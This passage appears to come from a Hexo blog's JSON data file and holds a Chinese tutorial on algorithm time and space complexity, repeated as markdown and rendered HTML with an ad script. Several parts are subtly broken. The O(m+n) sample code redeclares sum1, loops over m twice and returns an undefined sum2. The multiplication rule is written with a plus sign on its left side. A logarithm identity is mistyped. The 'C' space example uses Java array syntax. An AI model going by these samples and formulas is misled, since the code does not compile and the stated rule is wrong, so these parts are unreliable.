$,内层循环第四、五行代码都执行了$ n\\*n $次,需要的时间为$ 2\\*n^2\\*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)\\*time $。\n\n尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律：\n<div style=\"text-align: center; color: red;\">\n{% cq %} \n所有的代码执行时间T(n)与每行代码的执行次数成正比  \n$$ T(n) = O(f(n)) $$\n{% endcq %}\n</div>\n\n其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。\n\n所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。\n\n在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $;\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 时间复杂度分析\n{% endnote %}\n</div>\n\n前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？\n\n#### 1、只关注循环次数最多的一段代码\n\n在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。\n\n#### 2、加法法则：总复杂度等于量级最大的那段代码的复杂度\n\n如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。\n\n注意：\n当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。\n\n#### 3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\n\n比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) \\* O(n) = O(n^2) $ \n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 几种常见时间复杂度\n{% endnote %}\n</div>\n\n\n#### 1、$O(1)$\n\nO(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。\n\n#### 2、$ O(logN)、O(N\\*logN) $\n\n对数阶的时间复杂度非常常见，同时也是最难分析的一种。\n\n```C\nint i = 1;\nwhile(i <= n){\n  i = i * 2;\n}\n```\n在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8......,所以i的取值规律为 $$ 2^0 \\&nbsp;&nbsp;&nbsp;&nbsp;  2^1 \\&nbsp;&nbsp;  2^2 \\&nbsp;&nbsp; 2^3 ...  2^k... 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\\log_2 N) $。\n\n如果把代码改为如下。那时间复杂度是多少呢？\n\n```C\nint i = 1;\nwhile(i <= n){\n  i = i * 3;\n}\n```\n根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。\n\n实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？\n\n我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32\\*log_2N $，所以$ O(log_32) = O(C \\* log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： **在采用大O标记复杂度的时候，可以忽略系数，即$ O(C\\*f(n)) = O(f(n)) $**。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。\n\n如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。\n\n#### 2、$ O(m+n)、O(m\\*n) $\n\n我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。\n\n```C\nint func(int m, int n){\n  int sum1 = 0;\n  for(int i=1; i<=m; i++){\n    sum1 += i;\n  }\n\n  int sum1 = 0;\n  for(int j=1; j<=m; j++){\n    sum1 += j;\n  }\n  return sum1+sum2;\n}\n```\n\n从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$，\n\n针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) \\* f(n)) $。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 空间复杂度\n{% endnote %}\n</div>\n\n前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。\n\n还是拿具体的例子说明(仅供测试,一般没人这么写)\n\n```C\nvoid func(int n){\n  int i = 0;\n  int[] a = new int[n];\n  for(i; i<n; i++){\n    a[i] = i*1;\n    print(a[i]);\n  }\n}\n```\n\n和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n).\n\n我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。\n\n\n<br>","slug":"算法-复杂度分析","published":1,"updated":"2018-11-29T09:59:50.713Z","_id":"cjpdmv0ap002m4cv0a9wfictv","comments":1,"layout":"post","photos":[],"link":"","content":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"为什么需要复杂度分析\"><a href=\"#为什么需要复杂度分析\" class=\"headerlink\" title=\"为什么需要复杂度分析\"></a>为什么需要复杂度分析</h3></div><br></div>\n\n<p>有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？</p>\n<ul>\n<li><p>1、首先，这种评估方法确实是准确的，但是这种方法是”事后统计法”，<strong>是有非常大的局限性</strong>。</p>\n</li>\n<li><p>2、<strong>测试结果非常依赖测试环境</strong>，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。</p>\n</li>\n<li><p>3、对于<strong>不同的数据集，如果数据的有序程度不一样</strong>，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，<strong>数据规模的大小</strong>也可能对算法产生影响。</p>\n</li>\n</ul>\n<p>因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"大O复杂度表示法\"><a href=\"#大O复杂度表示法\" class=\"headerlink\" title=\"大O复杂度表示法\"></a>大O复杂度表示法</h3></div><br></div>\n\n<p>算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？</p>\n<p>这里举一个简单的例子，求解1，2，3……n 的累加和，以下为一个简单的代码实现：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i&lt;=n; i++)&#123;</span><br><span class=\"line\">    sum += i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从CPU的角度看，每一行代码都执行着类似的操作：<strong>读数据-运算-写数据</strong>。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算：</p>\n<p>第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \\times n \\times time $，所以此段代码执行的时间为$ (2n + 1)\\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。</p>\n<p>按照这个思路，再对以下代码段进行分析：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i &lt;= n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>; j &lt;= n; j++)&#123;</span><br><span class=\"line\">      sum += i*j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？</p>\n<p>第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n*time $,内层循环第四、五行代码都执行了$ n*n $次,需要的时间为$ 2*n^2*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)*time $。</p>\n<p>尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律：</p>\n<div style=\"text-align: center; color: red;\"><br><blockquote class=\"blockquote-center\"><p>所有的代码执行时间T(n)与每行代码的执行次数成正比<br>$$ T(n) = O(f(n)) $$</p>\n</blockquote><br></div>\n\n<p>其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。</p>\n<p>所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。</p>\n<p>在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $;</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"时间复杂度分析\"><a href=\"#时间复杂度分析\" class=\"headerlink\" title=\"时间复杂度分析\"></a>时间复杂度分析</h3></div><br></div>\n\n<p>前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？</p>\n<h4 id=\"1、只关注循环次数最多的一段代码\"><a href=\"#1、只关注循环次数最多的一段代码\" class=\"headerlink\" title=\"1、只关注循环次数最多的一段代码\"></a>1、只关注循环次数最多的一段代码</h4><p>在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。</p>\n<h4 id=\"2、加法法则：总复杂度等于量级最大的那段代码的复杂度\"><a href=\"#2、加法法则：总复杂度等于量级最大的那段代码的复杂度\" class=\"headerlink\" title=\"2、加法法则：总复杂度等于量级最大的那段代码的复杂度\"></a>2、加法法则：总复杂度等于量级最大的那段代码的复杂度</h4><p>如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。</p>\n<p>注意：<br>当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。</p>\n<h4 id=\"3、乘法法则-嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\"><a href=\"#3、乘法法则-嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\" class=\"headerlink\" title=\"3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\"></a>3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积</h4><p>比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) * O(n) = O(n^2) $ </p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"几种常见时间复杂度\"><a href=\"#几种常见时间复杂度\" class=\"headerlink\" title=\"几种常见时间复杂度\"></a>几种常见时间复杂度</h3></div><br></div>\n\n\n<h4 id=\"1、-O-1\"><a href=\"#1、-O-1\" class=\"headerlink\" title=\"1、$O(1)$\"></a>1、$O(1)$</h4><p>O(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。</p>\n<h4 id=\"2、-O-logN-、O-N-logN\"><a href=\"#2、-O-logN-、O-N-logN\" class=\"headerlink\" title=\"2、$ O(logN)、O(N*logN) $\"></a>2、$ O(logN)、O(N*logN) $</h4><p>对数阶的时间复杂度非常常见，同时也是最难分析的一种。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(i &lt;= n)&#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8……,所以i的取值规律为 $$ 2^0 \\&nbsp;&nbsp;&nbsp;&nbsp;  2^1 \\&nbsp;&nbsp;  2^2 \\&nbsp;&nbsp; 2^3 …  2^k… 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\\log_2 N) $。</p>\n<p>如果把代码改为如下。那时间复杂度是多少呢？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(i &lt;= n)&#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。</p>\n<p>实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？</p>\n<p>我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32*log_2N $，所以$ O(log_32) = O(C * log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： <strong>在采用大O标记复杂度的时候，可以忽略系数，即$ O(C*f(n)) = O(f(n)) $</strong>。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。</p>\n<p>如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。</p>\n<h4 id=\"2、-O-m-n-、O-m-n\"><a href=\"#2、-O-m-n-、O-m-n\" class=\"headerlink\" title=\"2、$ O(m+n)、O(m*n) $\"></a>2、$ O(m+n)、O(m*n) $</h4><p>我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i&lt;=m; i++)&#123;</span><br><span class=\"line\">    sum1 += i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>; j&lt;=m; j++)&#123;</span><br><span class=\"line\">    sum1 += j;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum1+sum2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$，</p>\n<p>针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) * f(n)) $。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"空间复杂度\"><a href=\"#空间复杂度\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h3></div><br></div>\n\n<p>前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。</p>\n<p>还是拿具体的例子说明(仅供测试,一般没人这么写)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span>[] a = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    a[i] = i*<span class=\"number\">1</span>;</span><br><span class=\"line\">    print(a[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n).</p>\n<p>我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。</p>\n<p><br></p>\n","site":{"data":{}},"excerpt":"","more":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"为什么需要复杂度分析\"><a href=\"#为什么需要复杂度分析\" class=\"headerlink\" title=\"为什么需要复杂度分析\"></a>为什么需要复杂度分析</h3></div><br></div>\n\n<p>有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？</p>\n<ul>\n<li><p>1、首先，这种评估方法确实是准确的，但是这种方法是”事后统计法”，<strong>是有非常大的局限性</strong>。</p>\n</li>\n<li><p>2、<strong>测试结果非常依赖测试环境</strong>，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。</p>\n</li>\n<li><p>3、对于<strong>不同的数据集，如果数据的有序程度不一样</strong>，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，<strong>数据规模的大小</strong>也可能对算法产生影响。</p>\n</li>\n</ul>\n<p>因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"大O复杂度表示法\"><a href=\"#大O复杂度表示法\" class=\"headerlink\" title=\"大O复杂度表示法\"></a>大O复杂度表示法</h3></div><br></div>\n\n<p>算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？</p>\n<p>这里举一个简单的例子，求解1，2，3……n 的累加和，以下为一个简单的代码实现：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i&lt;=n; i++)&#123;</span><br><span class=\"line\">    sum += i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从CPU的角度看，每一行代码都执行着类似的操作：<strong>读数据-运算-写数据</strong>。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算：</p>\n<p>第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \\times n \\times time $，所以此段代码执行的时间为$ (2n + 1)\\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。</p>\n<p>按照这个思路，再对以下代码段进行分析：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i &lt;= n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>; j &lt;= n; j++)&#123;</span><br><span class=\"line\">      sum += i*j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？</p>\n<p>第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n*time $,内层循环第四、五行代码都执行了$ n*n $次,需要的时间为$ 2*n^2*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)*time $。</p>\n<p>尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律：</p>\n<div style=\"text-align: center; color: red;\"><br><blockquote class=\"blockquote-center\"><p>所有的代码执行时间T(n)与每行代码的执行次数成正比<br>$$ T(n) = O(f(n)) $$</p>\n</blockquote><br></div>\n\n<p>其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。</p>\n<p>所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。</p>\n<p>在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $;</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"时间复杂度分析\"><a href=\"#时间复杂度分析\" class=\"headerlink\" title=\"时间复杂度分析\"></a>时间复杂度分析</h3></div><br></div>\n\n<p>前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？</p>\n<h4 id=\"1、只关注循环次数最多的一段代码\"><a href=\"#1、只关注循环次数最多的一段代码\" class=\"headerlink\" title=\"1、只关注循环次数最多的一段代码\"></a>1、只关注循环次数最多的一段代码</h4><p>在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。</p>\n<h4 id=\"2、加法法则：总复杂度等于量级最大的那段代码的复杂度\"><a href=\"#2、加法法则：总复杂度等于量级最大的那段代码的复杂度\" class=\"headerlink\" title=\"2、加法法则：总复杂度等于量级最大的那段代码的复杂度\"></a>2、加法法则：总复杂度等于量级最大的那段代码的复杂度</h4><p>如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。</p>\n<p>注意：<br>当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。</p>\n<h4 id=\"3、乘法法则-嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\"><a href=\"#3、乘法法则-嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\" class=\"headerlink\" title=\"3、乘法法则: 